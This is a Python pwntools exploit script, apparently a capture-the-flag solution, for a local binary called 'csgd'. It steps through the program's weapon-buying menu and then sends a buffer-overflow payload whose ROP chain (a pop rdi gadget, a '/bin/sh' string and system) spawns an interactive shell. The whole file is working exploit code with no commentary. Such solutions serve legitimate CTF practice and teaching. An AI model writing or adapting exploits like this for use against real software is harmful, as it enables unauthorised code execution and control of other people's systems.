from pwn import *
context.log_level = "debug"
'''
0xfffffddc - 0x1337face =  0x20000000*7 - 0x2000000 * 6 - 0x400000*3 - 0x80000*1 - 0x200*1 - 0x80*2 - 4*3 -2*1
'''
pop_rdi = 0x0000000000403fb3
binsh = 0x607350
system = 0x400E98
p = process("./csgd")
p.recvuntil(b"csgd's revenge\n")

p.send(b"/bin/sh\x00\n")
sleep(0.1)
p.send(b"/bin/sh\x00\n")
sleep(0.1)
p.send(b"m\n")
sleep(0.1)
p.send(b"1\n")
p.recvuntil(b"create T success!")
p.send(b"mm\n")
sleep(0.1)
p.send(b"y\n")
p.send(b"1\n")
p.recvuntil(b"create T success!")
p.send(b"y\n")
p.send(b"1\n")
p.recvuntil(b"create T success!\n")

p.send(b"bx"+ b"\n")

for i in range(7):
	p.send(b"3\n")
	p.send(b"1\n")
	p.recvuntil(b"Gei Gun\n")	

for i in range(6):
	p.send(b"3\n")
	p.send(b"2\n")
	p.recvuntil(b"scout\n")

for i in range(3):
	p.send(b"3\n")
	p.send(b"3\n")
	p.recvuntil(b"AWP\n")

p.send(b"4\n")
p.send(b"1\n")
p.recvuntil(b"P90\n")

p.send(b"1\n")
p.send(b"1\n")
p.recvuntil(b"glock18\n")

for i in range(2):
	p.send(b"1\n")
	p.send(b"2\n")	
	p.recvuntil(b"usp\n")

for i in range(3):
	p.send(b"o\n")
	p.recvuntil(b"4. Your choice:")
	p.send(b"4\n")	

p.send(b"o\n")
p.recvuntil(b"4. Your choice:")
p.send(b"2\n")	
p.send(b"q\n")
p.recvuntil("your lucky string>\n")

payload = b"a" * 0x3ff + b"\xfe" + b"a" * 8 + p32(0x408) + p32(0x30) + p64(0) + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)

p.interactive()